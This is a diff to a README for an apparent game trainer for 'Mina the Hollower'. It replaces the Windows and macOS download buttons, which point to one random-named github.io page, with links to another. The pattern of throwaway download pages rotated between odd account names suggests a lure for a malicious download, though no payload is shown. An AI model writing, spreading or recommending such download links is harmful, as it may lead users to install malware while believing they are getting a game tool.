@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/nkhbdbbubume/mina-the-hollower-trainer)
 
-[![Get Trainer](https://img.shields.io/badge/⬇️_Get_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Get Trainer](https://img.shields.io/badge/⬇️_Get_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://WaterCongressman.github.io/win-download/)
 
 ![Mina the Hollower](game.jpg)
 
@@ -76,7 +76,7 @@ The **Mina the Hollower Trainer** solves all these issues, giving you complete c
 
 ## 🍎 macOS
 
-[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://WatchMizukageSnap.github.io/getmac/)
+[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
 
 ## ⚖️ Legal
 
